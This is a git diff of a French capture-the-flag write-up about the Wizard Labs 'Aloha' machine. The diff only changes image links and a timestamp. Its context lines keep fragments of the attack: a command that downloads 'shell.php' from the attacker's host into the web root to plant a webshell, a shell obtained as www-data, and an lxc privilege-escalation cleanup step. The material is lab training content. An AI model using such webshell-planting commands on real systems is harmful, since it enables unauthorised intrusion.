@@ -54,11 +54,11 @@ PORT     STATE    SERVICE
 
 Quand on arrive sur le site on trouve un lien vers un blog *Wordpress* contenant ce billet :  
 
-![Wizard Labs CTF Aloha wordpress blog](https://github.com/devl00p/blog/raw/master/images/wizard-labs/aloha_blog.png)
+![Wizard Labs CTF Aloha wordpress blog](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/aloha_blog.png)
 
 On garde en tête le possible nom d'utilisateur *alex* et on se rend sur l'URL mentionnée :  
 
-![Wizard Labs CTF Aloha php scraper vulnerable script](https://github.com/devl00p/blog/raw/master/images/wizard-labs/aloha_scaper.png)
+![Wizard Labs CTF Aloha php scraper vulnerable script](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/aloha_scaper.png)
 
 On a donc un formulaire qui va charger une URL. Le premier réflexe est de mettre un port en écoute et voir comment est formatée la requête HTTP :  
 
@@ -145,7 +145,7 @@ http://10.254.0.29:8000/shell.php -o /var/www/html/devloop.php
 
 On obtient ainsi un shell en tant que *www-data* :  
 
-![Wizard Labs CTF Aloha webshell ](https://github.com/devl00p/blog/raw/master/images/wizard-labs/aloha_rce.png)
+![Wizard Labs CTF Aloha webshell ](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/aloha_rce.png)
 
 Flowers Powers
 --------------
@@ -301,4 +301,4 @@ alex@aloha:/tmp/.devloop$ lxc rm devloop
 
 r00ted :)
 
-*Published November 17 2020 at 14 59*
+*Published November 17 2020 at 14:59*
